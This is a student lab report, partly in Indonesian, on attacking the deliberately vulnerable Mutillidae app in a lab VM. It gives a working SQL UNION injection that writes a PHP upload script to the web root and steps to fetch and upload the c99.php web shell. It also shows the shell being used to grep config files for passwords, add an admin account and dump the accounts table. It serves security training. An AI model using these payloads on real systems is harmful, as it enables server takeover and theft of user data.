# Lesson 11 : SQL Injection Union Exploit #4 (Create PHP Upload Script)

## Download c99.php
1. Open a console terminal
2. Get Rar File
   - Buka terminal, jalankan perintah berikut :
   ```bash
   mkdir -p /root/backdoor
   cd /root/backdoor/
   wget http://www.computersecuritystudent.com/SECURITY_TOOLS/MUTILLIDAE/MUTILLIDAE_2511/lesson11/stuff.rar
   ls -lrt
   ```
   ![alt text](https://github.com/luqmanahmads/laporan-pksj/blob/master/assets/lesson_11/download.png "Home page")
3. Extract Rar File
   - Jalankan perintah berikut pada terminal :
   ```bash
   unrar x stuff.rar
   cat part1.txt part2.txt part3.txt > c99.php
   cp c99.php c99.php.bkp
   ls -lrt
   ```
   ![alt text](https://github.com/luqmanahmads/laporan-pksj/blob/master/assets/lesson_11/extract.png "Home page")
4. Configure and Prepare c99.php
   - Jalankan perintah berikut pada terminal :
   ```bash
   head -1 c99.php
   sed -i '1 s/^.*$/<?php/g' c99.php
   head -1 c99.php
   gzip c99.php
   ls -l
   ```
   ![alt text](https://github.com/luqmanahmads/laporan-pksj/blob/master/assets/lesson_11/configure.png "Home page")

## Navigate to the User Info Page
1. Buka browser kemudian akses Mutillidae sesuai ip metasploit pada alamat http://10.0.1.100/mutillidae
![alt text](https://github.com/luqmanahmads/laporan-pksj/blob/master/assets/lesson_6/1/start_browser.png "Home page")
2. Go to User Info
   - OWASP Top 10 --> A1 - SQL Injection --> SQLi - Extract Data --> User Info 
![alt text](https://github.com/luqmanahmads/laporan-pksj/blob/master/assets/lesson_7/user_info.png "Home page")

## Inject Upload Form into User Info Page
1. Inspect the View Account Details Button
   - Klik kanan pada Button View Account, kemudian inspect element
   ![alt text](https://github.com/luqmanahmads/laporan-pksj/blob/master/assets/lesson_11/user_info.png "Home page")
2. Change Button Placement
   - Pada bagian text-align udah dari yang semula center menjadi left
   ![alt text](https://github.com/luqmanahmads/laporan-pksj/blob/master/assets/lesson_11/change_button.png "Home page")
3. Inspect the Name Textbox
   - Klik kanan pada textbox **Name**, kemudian inspect element
   ![alt text](https://github.com/luqmanahmads/laporan-pksj/blob/master/assets/lesson_18/inspect.png "Home page")
4. Change Text Box Size
   - Pada bagian size, tambahkan kapasistasnya dari yg semula 20 menjadi 550
   ![alt text](https://github.com/luqmanahmads/laporan-pksj/blob/master/assets/lesson_11/change_name.png "Home page")
5. Backdoor Union SQL Union Injection
   - Pada kolom Textbox **Name** isikan 
   ```bash
   ' union select null,null,null,null,'<html><body><div><?php if(isset($_FILES["fupload"])) { $source = $_FILES["fupload"]["tmp_name"]; $target = $_FILES["fupload"]["name"]; move_uploaded_file($source,$target); system("chmod 770 $target"); $size = getImageSize($target); } ?></div><form enctype="multipart/form-data" action="<?php print $_SERVER["PHP_SELF"]?>" method="post"><p><input type="hidden" name="MAX_FILE_SIZE" value="500000"><input type="file" name="fupload"><br><input type="submit" name="upload!"><br></form></body></html>' INTO DUMPFILE '/var/www/html/mutillidae/upload_file.php' -- 
   ```
   - Pastikan anda menambahkan spasi setelah karakter **`--`**
   - Klik tombol View Account Details
   ![alt text](https://github.com/luqmanahmads/laporan-pksj/blob/master/assets/lesson_11/union.png "Home page")
6. Viewing the Results
	- Scroll kebawah untuk melihat hasilnya
	- Perhatikan hasilnya
  ![alt text](https://github.com/luqmanahmads/laporan-pksj/blob/master/assets/lesson_11/result_union.png "Home page")

## Upload c99.php to Mutillidae
1. Place the following URL in the Address Bar
	- Buka url berikut pada browser 
		http://10.0.1.100/mutillidae/upload_file.php
	- Klik tombol Browse
	- Cari file c99.php pada folder /root/backdoor
	- Klik tombol Open
	- Klik tombol Submit Query

## Using c99:php's to grab database password
1. Server security information
	- Buka url berikut pada browser 
		http://10.0.1.100/mutillidae/c99.php
	- Klik link navigasi Sec

2. Discover Mutillidae Application Directory
	- Isikan "pwd" pada textbox sebelah kiri paling atas
	- Klik Execute
3. Search php scripts for the string password
	- Isikan `find /var/www/mutillidae -name "*.inc" | xargs grep -i "dn" | grep "="` pada kalom kedua
	- Klik Execute
4. Viewing Password Results
    - Pada textbox pertama akan tampil hasil dari eksekusi command


## Using c99:php's to examine pillage the database
1. Connect to SQL
   - Klik link navigasi Sec
   - Isikan pada textbox
   ```
   Username: root
   Password: samurai
   Database: owasp10
   ```
   - Klik tombol Connect
2. Select table accounts
	- Select tabel account pada database owasp10
3. Insert Record Link
	- Klik link Insert 
4. Supply New User Information
   - Isikan pada textbox
```
cid Value: 20
username Value: hacker
password Value: hacker
mysignature: Noob
is_admin: TRUE
```
   - Klik tombol Confirm
5. Insert New User Information
   - Klik tombol Yes
6. Verify New User Information
   - Scroll kebawah untu melihat hasil
   - Veifikasi jika user hacker sudah dibuat
7. Prepare to Dump the Accounts Table
   - Scroll keatas
   - Klik link Dump
8. Dump the Accounts Table
   - Isikan pada textbox
```
  DB: owasp10
  Only tables (explode ";"): accounts
  File: ./dump_owasp10_accounts.sql
  Download Checkbox: Check it
  Save to file Checkbox: Check it
```
   - Klik tombol Dump
9. Save Accounts Dump File (Part 1)
   - Pilih Save File

## Proof of Lab
1. View Result
- Buka terminal
- Pindah direktori ke folder Downloads `cd Downloads`
- Jalankan perintah berikut
```
grep -i hacker dump_owasp10_accounts.sql
date
echo "Hendri F"
```
